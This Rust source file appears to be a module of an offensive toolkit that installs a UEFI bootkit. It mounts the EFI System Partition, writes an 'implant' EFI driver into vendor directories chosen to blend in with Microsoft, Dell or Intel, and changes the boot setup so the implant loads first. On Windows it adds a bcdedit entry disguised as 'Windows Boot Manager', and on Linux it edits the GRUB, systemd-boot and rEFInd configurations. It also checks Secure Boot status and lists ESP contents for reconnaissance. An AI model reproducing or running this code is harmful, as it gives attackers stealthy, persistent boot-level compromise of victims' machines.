//! EFI System Partition (ESP) operations — mount, write EFI drivers, install boot kit stubs.
//!
//! # Platform Support
//!
//! - **Windows**: ESP is accessible via `\\?\GLOBALROOT\Device\HarddiskVolume1\EFI\`
//!   or by mounting it to a drive letter.
//! - **Linux**: ESP is typically `/boot/efi` or needs to be mounted from the
//!   EFI system partition (typically the first FAT32 partition).

use crate::{BootKitConfig, BootloaderType, EfiGuid};
use anyhow::{bail, Context, Result};
use std::path::{Path, PathBuf};

/// Well-known vendor directory names that blend in on the ESP.
const BLEND_IN_VENDORS: &[&str] = &[
    "Microsoft",
    "Boot",
    "Intel",
    "Dell",
    "HP",
    "Lenovo",
    "ASUS",
    "tools",
];

/// Result of mounting the ESP.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct EspMountResult {
    /// The path where the ESP is accessible.
    pub mount_point: String,
    /// Whether the ESP was already mounted.
    pub was_already_mounted: bool,
    /// Detected bootloader type.
    pub bootloader_type: BootloaderType,
}

/// Result of writing an EFI driver to the ESP.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct EfiDriverWriteResult {
    /// Full path where the driver was written.
    pub driver_path: String,
    /// Size of the written driver in bytes.
    pub size: usize,
    /// SHA-256 hash of the written driver.
    pub sha256_hash: String,
    /// Vendor directory used.
    pub vendor_dir: String,
}

/// Result of installing a boot kit stub.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct BootKitInstallResult {
    /// Path to the installed boot kit stub.
    pub stub_path: String,
    /// Path to the original bootloader config backup.
    pub backup_path: String,
    /// The bootloader that was modified.
    pub bootloader_type: BootloaderType,
}

/// Mount or locate the EFI System Partition.
///
/// Returns the mount point path and whether it was already mounted.
pub fn mount_esp() -> Result<EspMountResult> {
    #[cfg(target_os = "linux")]
    {
        mount_esp_linux()
    }
    #[cfg(target_os = "windows")]
    {
        mount_esp_windows()
    }
    #[cfg(not(any(target_os = "linux", target_os = "windows")))]
    {
        bail!("ESP operations are not supported on this platform");
    }
}

/// Unmount the ESP (Linux only; no-op on Windows where it's always accessible).
pub fn unmount_esp(mount_point: &str) -> Result<()> {
    #[cfg(target_os = "linux")]
    {
        let output = std::process::Command::new("umount")
            .arg(mount_point)
            .output()
            .context("Failed to execute umount")?;
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            bail!("umount failed: {}", stderr);
        }
        Ok(())
    }
    #[cfg(not(target_os = "linux"))]
    {
        let _ = mount_point;
        Ok(())
    }
}

/// Write an EFI driver to the ESP.
///
/// The driver is written to `<ESP>/EFI/<vendor>/<driver_name>.efi`.
/// The vendor name is chosen from the `BootKitConfig` or defaults to a
/// name that blends in with existing EFI directories.
pub fn write_efi_driver(
    esp_path: &str,
    driver_name: &str,
    driver_bytes: &[u8],
    vendor: Option<&str>,
) -> Result<EfiDriverWriteResult> {
    // Validate the driver is a valid PE/COFF with EFI subsystem.
    validate_efi_pe(driver_bytes).context("Driver bytes are not a valid EFI PE/COFF binary")?;

    let vendor = vendor.unwrap_or("Boot");
    let driver_dir = PathBuf::from(esp_path).join("EFI").join(vendor);

    // Create the directory if it doesn't exist.
    std::fs::create_dir_all(&driver_dir).with_context(|| {
        format!(
            "Failed to create EFI driver directory: {}",
            driver_dir.display()
        )
    })?;

    let driver_path = driver_dir.join(format!("{}.efi", driver_name));

    // Write the driver.
    std::fs::write(&driver_path, driver_bytes)
        .with_context(|| format!("Failed to write EFI driver to {}", driver_path.display()))?;

    // Compute SHA-256 hash.
    let hash = sha256_hex(driver_bytes);

    Ok(EfiDriverWriteResult {
        driver_path: driver_path.to_string_lossy().to_string(),
        size: driver_bytes.len(),
        sha256_hash: hash,
        vendor_dir: vendor.to_string(),
    })
}

/// Install a boot kit stub on the ESP.
///
/// Modifies the bootloader configuration to load the implant EFI driver
/// before the OS bootloader. The exact mechanism depends on the detected
/// bootloader type.
pub fn install_boot_kit_stub(
    esp_path: &str,
    stub_config: &BootKitConfig,
) -> Result<BootKitInstallResult> {
    // Verify the ESP is valid.
    let efi_dir = PathBuf::from(esp_path).join("EFI");
    if !efi_dir.exists() {
        bail!("ESP path does not contain an EFI directory: {}", esp_path);
    }

    // Check Secure Boot status.
    let sb_status = crate::check_secure_boot_status();
    if sb_status == crate::SecureBootStatus::Enabled {
        bail!(
            "Secure Boot is ENABLED. Cannot install unsigned EFI driver. \
             A separate Secure Boot bypass vulnerability is required. \
             See: https://uefi.org/specifications"
        );
    }

    let bootloader_type = stub_config.bootloader_type;

    // Create backup of bootloader configuration.
    let backup_path = backup_bootloader_config(esp_path, bootloader_type)?;

    // Install based on bootloader type.
    match bootloader_type {
        BootloaderType::WindowsBcd => {
            install_windows_bootkit(esp_path, stub_config)?;
        }
        BootloaderType::Grub2 => {
            install_grub_bootkit(esp_path, stub_config)?;
        }
        BootloaderType::SystemdBoot => {
            install_systemd_boot_kit(esp_path, stub_config)?;
        }
        BootloaderType::Refind => {
            install_refind_bootkit(esp_path, stub_config)?;
        }
        BootloaderType::Unknown => {
            bail!("Unknown bootloader type — cannot install boot kit stub");
        }
    }

    Ok(BootKitInstallResult {
        stub_path: format!(
            "{}/EFI/{}/{}.efi",
            esp_path, stub_config.vendor_name, stub_config.driver_name
        ),
        backup_path,
        bootloader_type,
    })
}

/// Validate that the bytes represent a valid PE/COFF with EFI subsystem.
///
/// Checks:
/// 1. DOS header magic (MZ)
/// 2. PE signature (PE\0\0)
/// 3. Optional header magic (PE32+)
/// 4. Subsystem type (IMAGE_SUBSYSTEM_EFI_APPLICATION = 10,
///    IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER = 11,
///    IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER = 12,
///    IMAGE_SUBSYSTEM_EFI_ROM = 13)
pub fn validate_efi_pe(data: &[u8]) -> Result<()> {
    if data.len() < 64 {
        bail!("Data too short for a PE/COFF binary ({} bytes)", data.len());
    }

    // DOS header magic: MZ.
    if data[0] != b'M' || data[1] != b'Z' {
        bail!(
            "Invalid DOS header magic: expected MZ, got {:02X} {:02X}",
            data[0],
            data[1]
        );
    }

    // PE offset (at offset 0x3C).
    let pe_offset = u32::from_le_bytes([data[0x3C], data[0x3D], data[0x3E], data[0x3F]]) as usize;
    if pe_offset + 24 > data.len() {
        bail!(
            "PE offset ({}) points beyond data length ({})",
            pe_offset,
            data.len()
        );
    }

    // PE signature: PE\0\0.
    if &data[pe_offset..pe_offset + 4] != b"PE\0\0" {
        bail!(
            "Invalid PE signature at offset {}: expected PE\\0\\0, got {:02X} {:02X} {:02X} {:02X}",
            pe_offset,
            data[pe_offset],
            data[pe_offset + 1],
            data[pe_offset + 2],
            data[pe_offset + 3]
        );
    }

    // COFF header starts at pe_offset + 4.
    let coff_offset = pe_offset + 4;

    // Machine type (offset 0 in COFF header).
    let machine = u16::from_le_bytes([data[coff_offset], data[coff_offset + 1]]);
    // IMAGE_FILE_MACHINE_AMD64 = 0x8664, IMAGE_FILE_MACHINE_I386 = 0x014C,
    // IMAGE_FILE_MACHINE_ARM64 = 0xAA64.
    let valid_machines = [0x8664u16, 0x014C, 0xAA64];
    if !valid_machines.contains(&machine) {
        bail!("Unsupported machine type: 0x{:04X}", machine);
    }

    // Optional header size (offset 16 in COFF header).
    let opt_header_size =
        u16::from_le_bytes([data[coff_offset + 16], data[coff_offset + 17]]) as usize;
    if opt_header_size == 0 {
        bail!("No optional header present");
    }

    let opt_offset = coff_offset + 20;

    // Optional header magic (offset 0 in optional header).
    let opt_magic = u16::from_le_bytes([data[opt_offset], data[opt_offset + 1]]);
    if opt_magic != 0x20B {
        // PE32+ (0x20B). PE32 (0x10B) is also valid for 32-bit EFI.
        if opt_magic != 0x10B {
            bail!(
                "Invalid optional header magic: 0x{:04X} (expected 0x10B or 0x20B)",
                opt_magic
            );
        }
    }

    // Subsystem (offset 68 in PE32+ optional header, offset 44 in PE32).
    let subsystem_offset = if opt_magic == 0x20B {
        opt_offset + 68
    } else {
        opt_offset + 44
    };

    if subsystem_offset + 2 > data.len() {
        bail!("Data too short to read subsystem field");
    }

    let subsystem = u16::from_le_bytes([data[subsystem_offset], data[subsystem_offset + 1]]);

    // EFI subsystem types:
    // 10 = IMAGE_SUBSYSTEM_EFI_APPLICATION
    // 11 = IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER
    // 12 = IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER
    // 13 = IMAGE_SUBSYSTEM_EFI_ROM
    match subsystem {
        10..=13 => Ok(()),
        _ => bail!(
            "Not an EFI binary: subsystem is {} (expected 10-13 for EFI). \
             This PE is a {} binary.",
            subsystem,
            match subsystem {
                1 => "native",
                2 => "Windows GUI",
                3 => "Windows console",
                7 => "POSIX",
                9 => "Windows CE",
                _ => "unknown",
            }
        ),
    }
}

/// Check if a vendor name blends in with standard ESP directories.
pub fn is_blend_in_vendor(vendor: &str) -> bool {
    BLEND_IN_VENDORS.contains(&vendor)
}

/// Suggest a vendor name that blends in.
pub fn suggest_vendor_name(esp_path: &str) -> String {
    let efi_dir = PathBuf::from(esp_path).join("EFI");
    if let Ok(entries) = std::fs::read_dir(&efi_dir) {
        let existing: Vec<String> = entries
            .filter_map(|e| e.ok())
            .filter(|e| e.path().is_dir())
            .map(|e| e.file_name().to_string_lossy().to_string())
            .collect();

        // Prefer an existing vendor directory that sounds legitimate.
        let preferred = ["Microsoft", "Boot", "Intel", "Dell", "HP", "Lenovo", "ASUS"];
        for name in &preferred {
            if existing.iter().any(|e| e == *name) {
                return name.to_string();
            }
        }
    }

    "Boot".to_string()
}

/// Detect the bootloader type from the ESP contents.
pub fn detect_bootloader(esp_path: &str) -> BootloaderType {
    let efi_dir = PathBuf::from(esp_path).join("EFI");

    // Windows Boot Manager.
    if efi_dir.join("Microsoft/Boot/bootmgfw.efi").exists() {
        return BootloaderType::WindowsBcd;
    }

    // GRUB2.
    if efi_dir.join("ubuntu/grubx64.efi").exists()
        || efi_dir.join("fedora/grubx64.efi").exists()
        || efi_dir.join("centos/grubx64.efi").exists()
        || efi_dir.join("debian/grubx64.efi").exists()
    {
        return BootloaderType::Grub2;
    }

    // Check for grub.cfg in standard locations.
    for subdir in &["ubuntu", "fedora", "centos", "debian", "arch"] {
        if efi_dir.join(*subdir).join("grub.cfg").exists() {
            return BootloaderType::Grub2;
        }
    }

    // systemd-boot.
    if efi_dir.join("systemd/systemd-bootx64.efi").exists()
        || efi_dir.join("BOOT/BOOTX64.EFI").exists()
            && std::path::Path::new("/etc/systemd/boot").exists()
    {
        return BootloaderType::SystemdBoot;
    }

    // systemd-boot loader entries.
    let loader_entries = PathBuf::from(esp_path).join("loader/entries");
    if loader_entries.exists() {
        return BootloaderType::SystemdBoot;
    }

    // rEFInd.
    if efi_dir.join("refind/refind_x64.efi").exists() {
        return BootloaderType::Refind;
    }

    BootloaderType::Unknown
}

/// List EFI directories on the ESP (useful for reconnaissance).
pub fn list_esp_dirs(esp_path: &str) -> Result<Vec<String>> {
    let efi_dir = PathBuf::from(esp_path).join("EFI");
    if !efi_dir.exists() {
        bail!("ESP EFI directory not found: {}", efi_dir.display());
    }
    let mut dirs = Vec::new();
    for entry in std::fs::read_dir(&efi_dir).context("Failed to read EFI directory")? {
        let entry = entry.context("Failed to read directory entry")?;
        if entry.path().is_dir() {
            dirs.push(entry.file_name().to_string_lossy().to_string());
        }
    }
    dirs.sort();
    Ok(dirs)
}

/// List all .efi files on the ESP (recursive).
pub fn list_efi_files(esp_path: &str) -> Result<Vec<String>> {
    let efi_dir = PathBuf::from(esp_path).join("EFI");
    if !efi_dir.exists() {
        bail!("ESP EFI directory not found: {}", efi_dir.display());
    }
    let mut files = Vec::new();
    collect_efi_files(&efi_dir, &mut files)?;
    files.sort();
    Ok(files)
}

fn collect_efi_files(dir: &Path, files: &mut Vec<String>) -> Result<()> {
    for entry in std::fs::read_dir(dir).context("Failed to read directory")? {
        let entry = entry.context("Failed to read directory entry")?;
        let path = entry.path();
        if path.is_dir() {
            collect_efi_files(&path, files)?;
        } else if let Some(name) = path.file_name() {
            let name = name.to_string_lossy();
            if name.to_lowercase().ends_with(".efi") {
                files.push(path.to_string_lossy().to_string());
            }
        }
    }
    Ok(())
}

// ─── Platform-specific ESP mounting ─────────────────────────────────────

#[cfg(target_os = "linux")]
fn mount_esp_linux() -> Result<EspMountResult> {
    // Check common mount points first.
    let common_mounts = ["/boot/efi", "/efi", "/mnt/esp"];

    for mount in &common_mounts {
        if Path::new(mount).join("EFI").exists() {
            let bootloader = detect_bootloader(mount);
            return Ok(EspMountResult {
                mount_point: mount.to_string(),
                was_already_mounted: true,
                bootloader_type: bootloader,
            });
        }
    }

    // Try to find the ESP partition.
    let esp_device = find_esp_partition_linux()?;
    let mount_point = "/mnt/esp";

    // Create mount point.
    std::fs::create_dir_all(mount_point)
        .with_context(|| format!("Failed to create mount point {}", mount_point))?;

    // Mount the ESP.
    let output = std::process::Command::new("mount")
        .arg(&esp_device)
        .arg(mount_point)
        .output()
        .context("Failed to execute mount")?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        bail!(
            "Failed to mount ESP ({}) at {}: {}",
            esp_device,
            mount_point,
            stderr
        );
    }

    let bootloader = detect_bootloader(mount_point);
    Ok(EspMountResult {
        mount_point: mount_point.to_string(),
        was_already_mounted: false,
        bootloader_type: bootloader,
    })
}

#[cfg(target_os = "linux")]
fn find_esp_partition_linux() -> Result<String> {
    // Try reading /etc/fstab for the ESP mount entry.
    if let Ok(fstab) = std::fs::read_to_string("/etc/fstab") {
        for line in fstab.lines() {
            if line.contains("vfat") && (line.contains("/boot/efi") || line.contains("/efi")) {
                // Extract the device from the fstab entry.
                if let Some(device) = line.split_whitespace().next() {
                    if Path::new(device).exists() {
                        return Ok(device.to_string());
                    }
                    // Might be a UUID= or PARTUUID= reference.
                    if device.starts_with("UUID=") {
                        let uuid = &device[5..];
                        let dev_by_uuid = format!("/dev/disk/by-uuid/{}", uuid);
                        if Path::new(&dev_by_uuid).exists() {
                            return Ok(dev_by_uuid);
                        }
                    }
                    if device.starts_with("PARTUUID=") {
                        let partuuid = &device[9..];
                        let dev_by_partuuid = format!("/dev/disk/by-partuuid/{}", partuuid);
                        if Path::new(&dev_by_partuuid).exists() {
                            return Ok(dev_by_partuuid);
                        }
                    }
                }
            }
        }
    }

    // Fallback: try blkid to find the ESP partition.
    let output = std::process::Command::new("blkid")
        .args(["-t", "C12A7328-F81F-11D2-BA4B-00A0C93EC93B", "-o", "device"])
        .output()
        .context("Failed to execute blkid")?;

    if output.status.success() {
        let devices = String::from_utf8_lossy(&output.stdout);
        if let Some(first) = devices.lines().next() {
            if !first.is_empty() {
                return Ok(first.to_string());
            }
        }
    }

    // Last resort: check common partition devices.
    for dev in &["/dev/nvme0n1p1", "/dev/sda1", "/dev/vda1", "/dev/nvme0n1p2"] {
        if Path::new(dev).exists() {
            return Ok(dev.to_string());
        }
    }

    bail!("Could not find the EFI System Partition. Mount it manually and provide the path.")
}

#[cfg(target_os = "windows")]
fn mount_esp_windows() -> Result<EspMountResult> {
    // On Windows, the ESP is typically accessible via the EFI partition path.
    // Try common paths.
    let paths = [
        r"\\?\GLOBALROOT\device\harddiskvolume1\EFI",
        r"\\?\GLOBALROOT\device\harddiskvolume2\EFI",
        r"\\?\GLOBALROOT\device\harddiskvolume3\EFI",
        "S:\\EFI",
        "Z:\\EFI",
    ];

    for path in &paths {
        if Path::new(path).exists() {
            let esp_path = path.trim_end_matches("\\EFI");
            let bootloader = detect_bootloader(esp_path);
            return Ok(EspMountResult {
                mount_point: esp_path.to_string(),
                was_already_mounted: true,
                bootloader_type: bootloader,
            });
        }
    }

    // Try mounting the ESP using mountvol.
    let output = std::process::Command::new("mountvol")
        .arg("S:")
        .arg("/S")
        .output()
        .context("Failed to execute mountvol")?;

    if output.status.success() && Path::new("S:\\EFI").exists() {
        let bootloader = detect_bootloader("S:");
        return Ok(EspMountResult {
            mount_point: "S:".to_string(),
            was_already_mounted: false,
            bootloader_type: bootloader,
        });
    }

    bail!(
        "Could not locate the EFI System Partition on Windows. \
         Try running 'mountvol S: /S' as Administrator first."
    )
}

// ─── Boot kit installation helpers ──────────────────────────────────────

fn backup_bootloader_config(esp_path: &str, bootloader_type: BootloaderType) -> Result<String> {
    let backup_dir = PathBuf::from(esp_path)
        .join("EFI")
        .join(".orchestra-backup");
    std::fs::create_dir_all(&backup_dir).context("Failed to create backup directory")?;

    let backup_path = match bootloader_type {
        BootloaderType::WindowsBcd => {
            // BCD is stored in the BCD file.
            let src = PathBuf::from(esp_path).join("EFI/Microsoft/Boot/BCD");
            let dst = backup_dir.join("BCD.original");
            if src.exists() {
                std::fs::copy(&src, &dst).context("Failed to backup BCD")?;
            }
            dst.to_string_lossy().to_string()
        }
        BootloaderType::Grub2 => {
            // GRUB config can be in multiple locations.
            for subdir in &["ubuntu", "fedora", "centos", "debian", "arch"] {
                let src = PathBuf::from(esp_path)
                    .join("EFI")
                    .join(subdir)
                    .join("grub.cfg");
                if src.exists() {
                    let dst = backup_dir.join("grub.cfg.original");
                    std::fs::copy(&src, &dst).context("Failed to backup grub.cfg")?;
                    return Ok(dst.to_string_lossy().to_string());
                }
            }
            backup_dir
                .join("grub.cfg.none")
                .to_string_lossy()
                .to_string()
        }
        BootloaderType::SystemdBoot => {
            let src = PathBuf::from(esp_path).join("loader/loader.conf");
            let dst = backup_dir.join("loader.conf.original");
            if src.exists() {
                std::fs::copy(&src, &dst).context("Failed to backup loader.conf")?;
            }
            dst.to_string_lossy().to_string()
        }
        _ => backup_dir.join("unknown").to_string_lossy().to_string(),
    };

    Ok(backup_path)
}

fn install_windows_bootkit(esp_path: &str, config: &BootKitConfig) -> Result<()> {
    // On Windows, we add a new boot entry via the BCD store.
    // The boot entry points to our EFI driver which chains to bootmgfw.efi.
    let driver_path = format!(r"\EFI\{}\{}.efi", config.vendor_name, config.driver_name);

    // Use bcdedit to create a new boot entry.
    let output = std::process::Command::new("bcdedit")
        .args([
            "/create",
            "/d",
            "Windows Boot Manager",
            "/application",
            "osloader",
        ])
        .output()
        .context("Failed to execute bcdedit")?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        bail!("bcdedit create failed: {}", stderr);
    }

    // Parse the GUID from bcdedit output.
    let stdout = String::from_utf8_lossy(&output.stdout);
    let guid = stdout
        .split('{')
        .nth(1)
        .and_then(|s| s.split('}').next())
        .ok_or_else(|| anyhow::anyhow!("Failed to parse bcdedit GUID"))?;

    let entry_id = format!("{{{}}}", guid);

    // Set the device and path.
    for (key, value) in [
        ("/device", &format!("partition={}", esp_path)),
        ("/path", &driver_path),
    ] {
        let output = std::process::Command::new("bcdedit")
            .args(["/set", &entry_id, key, value])
            .output()
            .context("Failed to execute bcdedit")?;
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            tracing::warn!("bcdedit set {} failed: {}", key, stderr);
        }
    }

    // Display order: add before the default entry.
    let output = std::process::Command::new("bcdedit")
        .args(["/displayorder", &entry_id, "/addfirst"])
        .output()
        .context("Failed to execute bcdedit")?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        bail!("bcdedit displayorder failed: {}", stderr);
    }

    Ok(())
}

fn install_grub_bootkit(esp_path: &str, config: &BootKitConfig) -> Result<()> {
    // Add a chainloader entry to GRUB's config.
    let driver_path = format!(
        "(hd0,gpt1)/EFI/{}/{}.efi",
        config.vendor_name, config.driver_name
    );

    // Find the grub.cfg.
    let mut grub_cfg = None;
    let efi_dir = PathBuf::from(esp_path).join("EFI");
    for subdir in &["ubuntu", "fedora", "centos", "debian", "arch"] {
        let path = efi_dir.join(subdir).join("grub.cfg");
        if path.exists() {
            grub_cfg = Some(path);
            break;
        }
    }

    let grub_cfg = grub_cfg.ok_or_else(|| anyhow::anyhow!("grub.cfg not found on ESP"))?;

    let entry = format!(
        "\nmenuentry \"{}\" {{\n    chainloader {}\n}}\n",
        config.driver_name, driver_path
    );

    // Append the entry to grub.cfg.
    let mut existing = std::fs::read_to_string(&grub_cfg).context("Failed to read grub.cfg")?;
    existing.push_str(&entry);
    std::fs::write(&grub_cfg, existing).context("Failed to write grub.cfg")?;

    Ok(())
}

fn install_systemd_boot_kit(esp_path: &str, config: &BootKitConfig) -> Result<()> {
    // Add a loader entry for systemd-boot.
    let entries_dir = PathBuf::from(esp_path).join("loader/entries");
    std::fs::create_dir_all(&entries_dir).context("Failed to create loader entries directory")?;

    let entry_path = entries_dir.join(format!("{}.conf", config.driver_name));
    let driver_efi_path = format!("\\EFI\\{}\\{}.efi", config.vendor_name, config.driver_name);

    let entry_content = format!(
        "title {}\nefi {}\noptions\n",
        config.driver_name, driver_efi_path
    );

    std::fs::write(&entry_path, entry_content)
        .context("Failed to write systemd-boot loader entry")?;

    // Ensure our entry is first in the loader.conf default.
    let loader_conf_path = PathBuf::from(esp_path).join("loader/loader.conf");
    if loader_conf_path.exists() {
        let mut conf =
            std::fs::read_to_string(&loader_conf_path).context("Failed to read loader.conf")?;
        // Update or add the default entry.
        if conf.contains("default ") {
            conf = conf
                .lines()
                .map(|line| {
                    if line.starts_with("default ") {
                        format!("default {}", config.driver_name)
                    } else {
                        line.to_string()
                    }
                })
                .collect::<Vec<_>>()
                .join("\n");
        } else {
            conf.push_str(&format!("\ndefault {}", config.driver_name));
        }
        std::fs::write(&loader_conf_path, conf).context("Failed to write loader.conf")?;
    }

    Ok(())
}

fn install_refind_bootkit(esp_path: &str, config: &BootKitConfig) -> Result<()> {
    // rEFInd uses refind.conf; add a manual stanza.
    let refind_conf = PathBuf::from(esp_path).join("EFI/refind/refind.conf");
    if !refind_conf.exists() {
        bail!("rEFInd configuration not found");
    }

    let driver_path = format!("\\EFI\\{}\\{}.efi", config.vendor_name, config.driver_name);
    let stanza = format!(
        "\nmenuentry \"{}\" {{\n    loader {}\n    ostype Linux\n}}\n",
        config.driver_name, driver_path
    );

    let mut conf = std::fs::read_to_string(&refind_conf).context("Failed to read refind.conf")?;
    conf.push_str(&stanza);
    std::fs::write(&refind_conf, conf).context("Failed to write refind.conf")?;

    Ok(())
}

/// Compute SHA-256 hex hash of data.
fn sha256_hex(data: &[u8]) -> String {
    use sha2::Digest;
    let mut hasher = sha2::Sha256::new();
    hasher.update(data);
    let result = hasher.finalize();
    hex::encode(result)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn validate_efi_pe_rejects_too_short() {
        assert!(validate_efi_pe(&[0x00; 10]).is_err());
    }

    #[test]
    fn validate_efi_pe_rejects_bad_dos_magic() {
        let mut data = vec![0u8; 512];
        data[0] = 0x00;
        data[1] = 0x00;
        assert!(validate_efi_pe(&data).is_err());
    }

    #[test]
    fn validate_efi_pe_rejects_bad_pe_signature() {
        let mut data = vec![0u8; 512];
        data[0] = b'M';
        data[1] = b'Z';
        // Set PE offset to 0x80.
        data[0x3C] = 0x80;
        data[0x3D] = 0x00;
        data[0x3E] = 0x00;
        data[0x3F] = 0x00;
        // PE signature is wrong.
        data[0x80] = 0x00;
        assert!(validate_efi_pe(&data).is_err());
    }

    #[test]
    fn validate_efi_pe_accepts_valid_efi_application() {
        let data = build_minimal_efi_pe(10); // EFI Application
        assert!(validate_efi_pe(&data).is_ok());
    }

    #[test]
    fn validate_efi_pe_accepts_efi_boot_driver() {
        let data = build_minimal_efi_pe(11); // EFI Boot Service Driver
        assert!(validate_efi_pe(&data).is_ok());
    }

    #[test]
    fn validate_efi_pe_accepts_efi_runtime_driver() {
        let data = build_minimal_efi_pe(12); // EFI Runtime Driver
        assert!(validate_efi_pe(&data).is_ok());
    }

    #[test]
    fn validate_efi_pe_rejects_windows_subsystem() {
        let data = build_minimal_efi_pe(3); // Windows console
        let err = validate_efi_pe(&data).unwrap_err();
        assert!(err.to_string().contains("Not an EFI binary"));
    }

    #[test]
    fn is_blend_in_vendor_known() {
        assert!(is_blend_in_vendor("Microsoft"));
        assert!(is_blend_in_vendor("Boot"));
        assert!(is_blend_in_vendor("Intel"));
        assert!(!is_blend_in_vendor("EvilHack"));
    }

    #[test]
    fn sha256_hex_known() {
        let hash = sha256_hex(b"test");
        assert_eq!(hash.len(), 64);
        // SHA-256("test") = 9f86d081884c7d659a2feaa0c55ad015...
        assert!(hash.starts_with("9f86d081"));
    }

    /// Build a minimal valid PE/COFF binary with the given EFI subsystem.
    fn build_minimal_efi_pe(subsystem: u16) -> Vec<u8> {
        let mut data = vec![0u8; 512];

        // DOS header.
        data[0] = b'M';
        data[1] = b'Z';

        // PE offset.
        let pe_offset: u32 = 0x80;
        data[0x3C..0x40].copy_from_slice(&pe_offset.to_le_bytes());

        // PE signature.
        let pe_off = pe_offset as usize;
        data[pe_off] = b'P';
        data[pe_off + 1] = b'E';
        data[pe_off + 2] = 0x00;
        data[pe_off + 3] = 0x00;

        // COFF header (20 bytes).
        let coff_off = pe_off + 4;
        // Machine: AMD64.
        data[coff_off..coff_off + 2].copy_from_slice(&0x8664u16.to_le_bytes());
        // NumberOfSections: 1.
        data[coff_off + 2..coff_off + 4].copy_from_slice(&1u16.to_le_bytes());
        // TimeDateStamp.
        data[coff_off + 4..coff_off + 8].copy_from_slice(&0u32.to_le_bytes());
        // PointerToSymbolTable.
        data[coff_off + 8..coff_off + 12].copy_from_slice(&0u32.to_le_bytes());
        // NumberOfSymbols.
        data[coff_off + 12..coff_off + 16].copy_from_slice(&0u32.to_le_bytes());
        // SizeOfOptionalHeader: 240 (PE32+).
        data[coff_off + 16..coff_off + 18].copy_from_slice(&240u16.to_le_bytes());
        // Characteristics: EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE.
        data[coff_off + 18..coff_off + 20].copy_from_slice(&0x0022u16.to_le_bytes());

        // Optional header (PE32+, magic = 0x20B).
        let opt_off = coff_off + 20;
        data[opt_off..opt_off + 2].copy_from_slice(&0x20Bu16.to_le_bytes()); // Magic: PE32+.

        // Subsystem at offset 68 in PE32+ optional header.
        let sub_off = opt_off + 68;
        data[sub_off..sub_off + 2].copy_from_slice(&subsystem.to_le_bytes());

        data
    }
}
